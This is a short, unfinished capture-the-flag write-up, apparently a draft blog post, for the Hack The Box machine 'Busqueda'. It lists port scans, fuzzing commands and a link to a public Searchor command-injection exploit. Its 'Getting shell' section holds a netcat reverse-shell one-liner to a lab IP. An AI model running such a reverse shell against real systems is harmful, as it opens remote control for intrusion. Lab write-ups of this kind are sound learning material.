---
title: HTB Busqueda (2026)
date: 2026-08-04
author: kei5uke
draft: true
description: Writeup for HTB Busqueda (2026)
tags:
  - linux
  - writeup
---

# Nmap

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

nmap -sU -T4 --top-port=100 searcher.htb 
Nothing

```

# HTTP 80

![[HTB Busqueda - Screenshot_2026-08-04_at_16.08.04.png]]

## DNS search

 `ffuf -w /usr/share/wordlists/dnsmap.txt -H "Host:FUZZ.searcher.htb" -u [http://searcher.htb](http://searcher.htb/) -fs 286`

## Ferox

 `feroxbuster --url [http://searcher.htb](http://searcher.htb/) --wordlist /usr/share/wordlists/SecLists/Discovery/Web-Content/combined_directories.txt`

# Getting shell

https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/exploit.sh

jh1usoih2bkjaspwe92

```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.208 1234 >/tmp/f
```

```bash
docs/public/cfg/service_desk.yml
```
